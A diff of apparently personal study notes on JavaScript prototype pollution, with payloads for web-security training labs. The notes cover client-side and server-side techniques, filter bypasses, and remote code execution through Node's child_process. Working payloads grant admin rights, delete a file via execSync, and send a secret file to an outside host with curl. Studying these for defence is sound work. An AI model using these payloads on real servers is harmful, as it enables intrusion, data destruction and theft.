@@ -124,13 +124,154 @@ Client-side prototype pollution vulnerabilities:
     + Prototype pollution gadgets may occur in third-party libraries that imported
     + Recommend using DOM Invader to identify sources and gadgets
         + Much quicker, ensure won't muss vuln that would be extremely tricky to notice
+- Prototype pollution via browser APIs: (read for more info in paper analyze)
+    + Via fetch():
+        + fetch(resource, options)
+        + Example:
+            fetch('https://normal-website.com/my-account/change-email', {
+                method: 'POST',
+                body: 'user=carlos&email=carlos%40ginandjuice.shop'
+            })
+        + Read more in website
+        + Can use this technique to control any undefined properties of options object pass to fetch()
+    + Via Object.defineProperty(): (1)
+        + Object.defineProperty(obj, prop, descriptor)
+        + Dev with some knowledge of pp may attempt to block potential gadget by using Object.defineProperty() method
+        + Example:
+            Object.defineProperty(vulnerableObject, 'gadgetProperty', {
+                configurable: false,
+                writable: false
+            })
+        + It seem like will prevent vuln object from inheriting malicious version of gadget property via prototype chain
+        + However, this approach is flawed. Like fetch(), Object.defineProperty() also accept option object known as descriptor, dev can use this to set initial value for property that's being defined
+        + This case, attacker may able bypass defense by polluting value property
 
 
-Server-side prototype pollution:
-- 
+Server-side prototype pollution vulnerabilities:
+- JS was originally client-side language designed to run in browser. However, the emergence of server-side runtimes (such as Node.js), it is now widely used to build servers, API and other BE application
+
+- Why server-side pp more difficult to detect:
+    + No source code access
+    + Lack of developer tools: as JS running on remote system -> you don't have ability to inspect object at runtime like client-side browser's devtool to inspect DOM -> hard to tell if success or not
+    + The DoS problem
+    + Pollution persistence
+- Detect server-side pp via polluted property reflection: (6)
+    + Easy trap is forgetting that for...in loop iterates over all object's property (include one that inherited via prototype chain, but not include built-in properties as these are non-enumerable by default)
+    + Example:
+        + In object:
+            const myObject = { a: 1, b: 2 };
+            Object.prototype.foo = 'bar';
+            myObject.hasOwnProperty('foo'); // false
+            for(const propertyKey in myObject){
+                console.log(propertyKey);
+            }
+            // Output: a, b, foo
+        + In array:
+            const myArray = ['a','b'];
+            Object.prototype.foo = 'bar';
+            for(const arrayKey in myArray){
+                console.log(arrayKey);
+            }
+            // Output: 0, 1, foo
+    + POST or PUT request submit JSON data are candidate for this behavior
+    + Any feature that involve update user data are worth to try, cuz this often merge incoming data into existing object
+- Detecting server-side prototype pollution without polluted property reflection: (7)
+    + Most time, even success polluted server-side, still won't see reflection
+    + So need to compare server behavior between different payload
+    + Some techniques are non-destructive: (can read more in research analyze)
+        + Status code override
+        + JSON spaces override
+        + Charset override
+- Scanning for server-side prototype pollution sources:
+    + Extension: https://portswigger.net/bappstore/c1d4bd60626d4178a54d36ee802cf7e8
+    + Document: https://portswigger.net/burp/documentation/desktop/extend-burp/extensions/installing/bapp-store
+    + Code: https://github.com/portswigger/server-side-prototype-pollution
+- Bypassing input filters for server-side prototype pollution: (8)
+    + Web often attempt to prevent or patch pp vuln by filtering key like __proto__
+    + But key sanitization is not a robust long-term solution as there are number of ways can bypassed
+    + Node app can also delete or disable __proto__ using flag --disable-proto=delete or --disable-proto=throw but still can't prevent entirely
+    + Some ways to bypass:
+        + Obfuscate the prohibited keywords so they're missed during the sanitization
+        + Access the prototype via the constructor property instead of __proto__
+- RCE via server-side prototype pollution: (read more in research)
+    + Identifying a vulnerable request:
+        + There are number of potential command execution sink in Node, which occur in child_process module
+        + They often invoked by request that occurs asynchronously -> Need to use Burp Collaborator
+        + Payload:
+            "__proto__": {
+                "shell":"node",
+                "NODE_OPTIONS":"--inspect=YOUR-COLLABORATOR-ID\"\".oastify\"\".com",
+                //"NODE_OPTIONS": "--eval=require('child_process').execSync('id')"
+            }
+            + NODE_OPTIONS: environment variable (property of env object), enable to define string of command line that should be used by default whenever start a new Node process (only apply to node process)
+            + shell property:
+                + Some Node function accept optional shell property for creating new child process
+                + Enable dev to set a specific shell (such as bash or node) to run command
+            + Both arguments can control via pp if it is undefined
+            + This payload cause interaction with Burp Collaborator whenever new Node process is created
+            + --eval in NODE_OPTIONS are always blocked -> need to use execArgv instead of --eval
+    + RCE via child_process.fork(): (9)
+        + Method to create new Node subprocesses: child_process.spawn(), child_process.fork()
+        + fork() method accept option object, one of options is execArgv property:
+            + This is array of string contain command-line arguments that used when spawning child process -> can control if undefined
+            + This gadget let directly control command-line arguments, give access to some attack vector that wouldn't be possible using NODE_OPTIONS
+            + Interest argument is --eval, enable to pass arbitrary JS that will be executed by child process and load additional module into environment
+                "execArgv": [
+                    "--eval=require('<module>')"
+                ]
+        + Payload:
+            "__proto__": {
+                "execArgv": [
+                    "--eval=require('child_process').execSync('id')",
+                    //"--eval=require('http').get('http://COLLABORATOR/')",
+                    //"--inspect=COLLABORATOR-ID.oastify.com"
+                ]
+            }
+    + RCE via child_process.execSync(): (10)
+        + App can call execSync() by itself to run command (no need to chain fork() like --eval)
+        + execSync():
+            + Also accept option object, but doesn't accept 'execArgv' property
+            + We still can inject via 'shell' + 'input'
+            + input: string that passed to child process STDIN stream, executed as a system command by execSync()
+                + Usually left undefined since app pass command as argument instead
+            + shell: declare which shell run command
+                + Usually left undefined -> default use system shell
+        + 3 caveats (why picking a shell isn't simple):
+            + Shell only take the executable name and doesn't allow to set any additional argument (shell:"vim" OK, "vim -X" not)
+            + Shell always run with -c. But -c with node = only syntax check (won't execute)
+                -> hard to use node as shell
+                + If use something like Vim/ex, -c flag not effect them execute
+            + Shell must read command from stdin
+        + Although aren't really intended to be shell, Vim/ex meet all 3 caveats:
+            "shell":"vim",
+            "input":":! <command>\n"
+            + :! --> run a shell command from inside vim
+            + require \n, cuz vim is interactive, needs user hit Enter to run -> need \n to simulate this
+        + Additional limitation:
+            + Some tool want to use don't read data from stdin by default
+            + Some ways workaround this:
+                + curl: use -d @- (read stdin -> send as POST body) -> for exfiltration
+                    ":! <command> | curl -d @- http://COLLABORATOR\n"
+                + xargs: convert stdin to list of arguments
 
 
 
+01_Client_side_prototype_pollution_via_browser_APIs
+- Look at file /resources/js/searchLoggerConfigurable.js, notice searchLogger() function:
+    async function searchLogger() {
+        let config = {params: deparam(new URL(location).searchParams.toString()), transport_url: false};
+        Object.defineProperty(config, 'transport_url', {configurable: false, writable: false});
+        if(config.transport_url) {
+            let script = document.createElement('script');
+            script.src = config.transport_url;
+            document.body.appendChild(script);
+        }
+        ...
+    }
+    + It take entire query string as params for config, block override transport_url by Object.defineProperty, then assign transport_url to script
+- But Object.defineProperty() was not safe enough, we can pollute the options object to assign payload
+- Payload:
+    /?__proto__[value]=data:,alert(1);
 
 02_DOM_XSS_via_client_side_prototype_pollution
 - Look at file searchLogger.js, notice these lines of code
@@ -216,3 +357,107 @@ Server-side prototype pollution:
 - Payload:
     #constructor[prototype][hitCallback]=alert(1)
     #__proto__[hitCallback]=alert(1)
+
+06_Privilege_escalation_via_server_side_prototype_pollution
+- Read file /resources/js/updateAddress.js
+    for (const [key, value] of Object.entries(responseJson).filter(e => e[0] !== 'isAdmin')) {
+        ....
+    }
+    + Notice variable name isAdmin
+    + Try to change that to true by pp via json
+- Payload:
+    payload = {
+        "sessionId": s.cookies.get_dict()['session'],
+        "__proto__": {
+            "isAdmin": 1
+        }
+    }
+
+07_Detecting_server_side_prototype_pollution_without_polluted_property_reflection
+- Status code override:
+    + Payload:
+        {
+            "sessionId":{session_id},
+        }
+        
+        {
+            "sessionId":{session_id},
+            "__proto__": {
+                "status":500
+            },
+        }
+        + Cuz both of this have additional , at the end -> both cause error
+        + But second payload error status code depend on number we provide
+        -> Success detect pp
+- JSON spaces override:
+    + Payload:
+        {
+            "sessionId":{session_id},
+        }
+
+        {
+            "sessionId":{session_id},
+            "__proto__": {
+                "json spaces":10
+            }
+        }
+        + To compare json space, first we need to switch to raw tab in response
+        + If see different
+        -> Success detect pp
+- Charset override:
+    + Payload:
+        {
+            "sessionId":{session_id},
+            "address_line_1":"+AGIAYQBy-",
+            "__proto__": {
+                "content-type": "application/json; charset=utf-7"
+            }
+        }
+
+        {
+            "sessionId":{session_id},
+            "address_line_1":"+AGIAYQBy-",
+            "__proto__": {
+                "content-type": "application/json; charset=utf-8"
+            }
+        }
+        + Each payload send twice to see the different
+        -> Success detect pp
+
+08_Bypassing_flawed_input_filters_for_server_side_prototype_pollution
+- Try payload in lab 06 with __proto__, but something like key sanitization happen
+- So instead of __proto__, we can try do it with other key like constructor.prototype
+- Payload:
+    payload = {
+        "sessionId": s.cookies.get_dict()['session'],
+        "constructor":{
+            "prototype":{
+                "isAdmin":1
+            }
+        }
+    }
+
+09_Remote_code_execution_via_server_side_prototype_pollution
+- Lab hint: The command execution sink is only invoked when an admin user triggers vulnerable functionality on the site
+- RCE via child_process
+- Payload:
+    {
+        "sessionId": s.cookies.get_dict()['session'],
+        "__proto__": {
+            "execArgv": [
+                "--eval=require('child_process').execSync('rm /home/carlos/morale.txt')"
+            ]
+        }
+    }
+
+10_Exfiltrating_sensitive_data_via_server_side_prototype_pollution
+- Payload:
+    {
+        "sessionId": s.cookies.get_dict()['session'],
+        "__proto__": {
+            "shell": "vim",
+            "input": ":! cat /home/carlos/secret | base64 | curl -d @- http://tvsicqfyh2ns2t0yl69xe9f4svymmea3.oastify.com\n"
+        }
+    }
+- Note:
+    + Although maintainence job got error in response, it still trigger and send output to Burp Collaborator
